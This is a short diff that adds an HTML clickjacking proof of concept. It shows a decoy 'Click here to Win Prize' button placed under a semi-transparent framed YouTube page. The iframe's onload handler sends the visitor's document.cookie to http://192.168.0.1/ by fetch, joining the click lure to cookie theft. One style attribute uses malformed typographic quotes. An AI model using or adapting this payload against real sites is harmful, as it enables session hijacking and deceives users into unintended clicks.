@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+</head>
+<body>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
+<iframe  src="https://youtu.be/tyt_d6SN0nE?list=RDGMEM_6azG-gbwFIpRtH6PATXiQVMtyt_d6SN0nE" width=80% height=5800% style=”opacity: 0.5;” onload="fetch('http://192.168.0.1/' + encodeURIComponent(document.cookie))"></iframe>
+</body>
+</html>
